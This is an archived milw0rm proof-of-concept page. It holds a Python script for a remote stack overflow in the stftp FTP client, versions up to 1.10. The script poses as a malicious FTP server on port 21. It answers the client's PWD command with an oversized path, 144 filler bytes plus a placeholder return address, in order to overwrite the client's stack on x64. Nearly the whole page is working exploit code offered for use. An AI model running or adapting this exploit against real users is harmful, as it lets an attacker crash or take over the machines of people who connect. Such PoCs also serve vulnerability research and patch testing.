<html><head><title>stftp <= 1.10 (PWD Response) Remote Stack Overflow PoC</title></head><pre>#!/usr/bin/python
# stftp &lt;= 1.10 (PWD Response Stack Overflow) PoC
# Tested on: OpenSuSE 11.1 x64
# Coded: sqlevil aka evil
# Thanks to str0ke, softxor, rembrandt, benkei, Tekto, madman - (milw0rm.com welcome back!)
# Contact us at: irc.lcirc.net:+6657 - #hcbfh (SSL require)

from socket import *
class tcp:   
    def __init__(self):
        self.s = socket(AF_INET, SOCK_STREAM)
        self.s.bind((&quot;0.0.0.0&quot;,21))
    
    def getnext(self):
        print (&quot;Listening for connection ...\n&quot;)
        self.s.listen(1)
        c,  addr = self.s.accept()
        print (&quot;client is nOw cOnnected\n&quot;)
        return c
    def close(self):
        self.s.close();

class ftp:
    def exCommand(self, command):
        if (len(command)&lt;80):
            print(&quot;S -&gt; C: &quot; + command)
        else:
            print(&quot;S -&gt; C: &quot; + command[0:80] + &quot; ...&quot;)
        self.s.send(command+'\r\n')

    def getCommand(self, size=1024):
        ret = self.s.recv(size);
        if (len(ret)&lt;80):
            print (&quot;C -&gt; S: &quot; +ret)
        else:
            print (&quot;C -&gt; S: &quot; +ret[0:80] + &quot; ...&quot;)
        return ret
      
    def __init__(self,  c):
        self.s=c
        
    def Banner(self,  str=&quot;Hi There&quot;):
        self.exCommand( &quot;220 %s&quot; % str)
    def Auth(self, str1=&quot;pwd please&quot;,  str2=&quot;OK&quot;):
        self.getCommand()
        self.exCommand( &quot;331 %s&quot; % str1)
        self.getCommand()
        self.exCommand( &quot;230 %s&quot; % str2)
        
    def PWD(self,  path='/',  str='&quot;%s&quot; is current directory.'):
        self.getCommand()
        self.exCommand( '257 %s' % str % path)
        
    def Reject(self):
        self.getCommand()
        self.exCommand( &quot;230 ERR Type set to I.&quot;)
    def SYST(self):
        self.getCommand()
        self.exCommand( &quot;215 UNIX Type: L8&quot;)
    def PORT(self):
        self.getCommand()
        self.exCommand( &quot;200 PORT command successful.&quot;)
        
    def CWD(self):
        self.getCommand()
        self.exCommand( &quot;250 CWD command successful.&quot;)
    def PASIV(self):
        self.getCommand()
        self.exCommand( &quot;227 Entering Passive Mode (174,142,51,122,17,214).&quot;)
    def stftp(self):
        # TODO: Enter yOur desire address here
        retadd='abcdefghi'
        self.Banner()
        self.Auth()
        # This custom string is adjusted for x64 architeture
        self.PWD('x'*144+retadd)
        self.getCommand()
t = tcp()
try:
    f=ftp(t.getnext())
    f.stftp()
    
except: pass
finally:
    t.close()
    print &quot;by3 &lt;&lt;&lt;&quot;

# milw0rm.com [2009-07-27]</pre></html>